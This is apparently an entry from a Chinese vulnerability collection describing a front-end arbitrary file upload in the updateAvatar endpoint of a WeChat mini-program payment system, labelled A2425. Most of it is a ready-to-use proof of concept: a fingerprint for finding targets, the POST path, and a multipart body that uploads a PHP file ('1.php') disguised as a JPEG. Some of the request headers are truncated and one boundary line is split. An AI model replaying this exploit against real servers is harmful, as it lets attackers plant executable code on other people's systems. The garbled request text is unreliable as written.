# A2425美团代付三合一微信小程序系统updateAvatar前台任意文件上传漏洞

- **系统**：A2425　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"/h5/static/js/chunk-vendors.js"`
- **请求**：`POST /index.login/updateAvatar HTTP/1.1`

**请求体 / payload**
```
KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGjxay59g
VfQyovGC
Content-Length: 196
------WebKitFormBoundaryGjxay59gVfQyovGC
Content-Disposition: form-data; name="image"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundaryGjxay59gVfQyovGC--
上传定位IP+返回路径
```
- **预期**：200　|　—